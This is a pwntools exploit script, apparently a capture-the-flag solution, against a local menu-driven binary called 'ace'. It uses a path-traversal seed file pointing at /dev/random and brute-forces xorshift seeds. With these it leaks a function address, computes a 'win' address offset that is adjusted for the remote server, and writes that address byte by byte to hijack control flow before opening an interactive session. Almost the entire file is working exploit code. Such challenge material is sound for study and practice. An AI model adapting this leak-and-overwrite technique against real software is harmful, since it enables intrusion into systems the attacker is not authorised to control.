from pwn import *

conn = process("./target/debug/ace")
# Set til ../../../../../../../../dev/random
# på severr
DEV_RANDOM = b"devrandomly"

def nxt_u32(state):
    state ^= state << 13
    state %= 2**32
    state ^= state >> 17
    state %= 2**32
    state ^= state << 5
    state %= 2**32
    return state

def as_char(state):
    return state & 0xFF

def find_seed(goal_char, padding):
    seed = 0
    while True:
        state = seed
        for _ in range(padding):
            state = nxt_u32(state)
        if as_char(state) == goal_char:
            return seed.to_bytes(4, byteorder="little")
        seed += 1

def forget_menu():
    conn.recvuntil(b"> ")

def reseed():
    conn.send(b"3\n")
    forget_menu()

def add_char():
    conn.send(b"2\n")
    conn.recvline()
    conn.send(b"char\n")
    forget_menu()

def add_u64_hex():
    conn.send(b"2\n")
    conn.recvline()
    conn.send(b"u64\n")
    conn.recvline()
    conn.send(b"hex\n")
    forget_menu()

def add_u32_hex():
    conn.send(b"2\n")
    conn.recvline()
    conn.send(b"u32\n")
    conn.recvline()
    conn.send(b"hex\n")
    forget_menu()

def add_arr_hex():
    conn.send(b"2\n")
    conn.recvline()
    conn.send(b"array\n")
    conn.recvline()
    conn.send(b"hex\n")
    forget_menu()


def get_print():
    conn.send(b"1\n")
    lines = conn.recvuntil(b"> ").split(b"\n")
    return lines

def remove_index(idx):
    conn.send(b"4\n")
    conn.recvline()
    conn.send(f"{idx}".encode("latin") + b"\n")
    forget_menu()

def dothing():
    reseed()
    add_char()
    pr = get_print()

    add_char()
    pr = get_print()

    add_char()
    pr = get_print()

    add_char()
    pr = get_print()
    print(pr[0][9:])

def set_seed(bts4):
    conn.send(b"5\n")
    conn.recvline()
    conn.send(DEV_RANDOM + b"\n")
    conn.recvuntil(b":")
    conn.send(bts4 + b"\n")
    forget_menu()
forget_menu()
reseed()
for _ in range(32):
    add_char()

reseed()

for _ in range(16):
    add_char()

add_u64_hex()

lines = get_print()[17:17+8]
leak = [ord(line.decode()[-1]) for line in lines]
leak = bytes(leak).hex()
print("Leaked print_u64_hex:", leak)
# We want to jump to the leaked address + 3456
# actually + 3536 on the actual server
win_addr_hex = f"{int(leak, 16)+3456:016x}"
print(f"Win address         : {win_addr_hex}")

for i in range(8):
    goal = int(win_addr_hex[len(win_addr_hex)-(i+1)*2:len(win_addr_hex)-i*2], 16)
    seed = find_seed(goal, 13-i)

    set_seed(seed)
    reseed()
    add_u32_hex()
    for _ in range(12-i):
        add_char()


print(f"Win address         : {win_addr_hex}")

conn.interactive()

